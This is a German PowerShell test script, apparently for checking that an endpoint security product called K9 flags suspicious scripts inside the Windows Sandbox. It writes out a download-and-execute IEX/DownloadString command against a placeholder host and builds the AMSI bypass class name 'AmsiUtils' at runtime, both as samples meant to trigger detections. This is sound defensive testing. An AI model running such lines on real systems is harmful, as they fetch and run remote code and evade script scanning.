<#
  Kurzlauf "PowerShell-Skriptpruefung mit Richtlinie" IN DER WINDOWS-SANDBOX
  (nach sandbox-test-ausbau1.ps1, K9 installiert). Nur Skripte gegen nicht
  erreichbare Adressen und Namen, die erst zur Laufzeit zusammengesetzt werden.
  Laeuft nur im Sandbox-Konto UND wenn der Projektordner nicht existiert (also nie auf dem PC).

  Erwartung (Richtlinie an, jeweils ein NEUER PowerShell-Prozess):
    R1 Download-und-Ausfuehren-Skript   -> Hoch SKRIPT:LADEN-UND-AUSFUEHREN
    R2 AMSI-Klassenname                  -> Kritisch SKRIPT:AMSI-UMGEHUNG
    R3 harmloses Skript                  -> keine Meldung
    danach Richtlinie aus, Werte entfernt
#>
$ErrorActionPreference = 'Continue'
if ($env:USERNAME -ne 'WDAGUtilityAccount' -or (Test-Path 'C:\K9-Quelltext')) {
    Write-Host 'Nur in der Windows-Sandbox ausfuehren.'
    exit 1
}
$out = 'C:\Ergebnis'
$prog = 'C:\Testlabor\programm'
$k9 = 'C:\Program Files\K9\k9.exe'
Start-Transcript -Path (Join-Path $out 'protokoll.txt') | Out-Null
function Step([string]$t) { Write-Host "`n=== $t ($(Get-Date -Format HH:mm:ss))" }
function Wait([int]$s, [string]$why) { Write-Host "  warte $s s ($why)"; Start-Sleep -Seconds $s }
function Run([string]$exe) { & $exe @args 2>&1 | Out-String | Write-Host; Write-Host "  (Exitcode $LASTEXITCODE)" }

Step 'A Neue Version einspielen (Aktualisierung)'
Run "$prog\k9.exe" dienst aktualisieren
for ($i = 0; $i -lt 60 -and -not (Get-Process k9-agent -ErrorAction SilentlyContinue); $i++) { Start-Sleep 5 }
Wait 30 'Dienst bereit'

Step 'B Richtlinie an'
Run $k9 powershell-protokoll an
Run $k9 powershell-protokoll status

Step 'R1 Download-und-Ausfuehren-Skript (neuer Prozess)'
Run powershell.exe -NoProfile -Command "try { IEX (New-Object Net.WebClient).DownloadString('http://beispiel.invalid/r1.ps1') } catch { 'nicht erreichbar (erwartet)' }"
Wait 10 'Meldung'

Step 'R2 AMSI-Klassenname (neuer Prozess, Name zur Laufzeit zusammengesetzt)'
# Als Skriptdatei (Anfuehrungszeichen ueberstehen die Befehlszeile nicht zuverlaessig).
$r2 = Join-Path $env:TEMP 'vs-r2.ps1'
Set-Content -Path $r2 -Encoding ASCII -Value @'
$t = 'System.Management.Automation.' + 'Amsi' + 'Utils'
& ([scriptblock]::Create("`$n = '$t'; [void]`$n.Length"))
'R2 ausgefuehrt'
'@
Run powershell.exe -NoProfile -ExecutionPolicy Bypass -File $r2
Remove-Item $r2 -Force -ErrorAction SilentlyContinue
Wait 10 'Meldung'

Step 'R3 harmloses Skript (neuer Prozess)'
Run powershell.exe -NoProfile -Command "Get-ChildItem C:\Windows | Measure-Object | Out-Null; 'harmlos'"
Wait 10 'keine Meldung erwartet'

Step 'C Richtlinie aus und pruefen'
Run $k9 powershell-protokoll aus
Run $k9 powershell-protokoll status
foreach ($k in 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging', 'HKLM:\SOFTWARE\Policies\Microsoft\PowerShellCore\ScriptBlockLogging') {
    $v = (Get-ItemProperty -Path $k -ErrorAction SilentlyContinue).EnableScriptBlockLogging
    Write-Host "  $k EnableScriptBlockLogging = $(if ($null -eq $v) { '(nicht vorhanden)' } else { $v })"
}

Step 'Ergebnisse sammeln'
& $k9 erkennungen --alle *> (Join-Path $out 'erkennungen.txt')
Get-ChildItem 'C:\ProgramData\K9\logs' -File -ErrorAction SilentlyContinue |
    ForEach-Object { Copy-Item $_.FullName (Join-Path $out ('dienst-' + $_.BaseName + '.log')) }
Stop-Transcript | Out-Null
Write-Host "`nFertig. Ergebnisse in C:\Ergebnis."
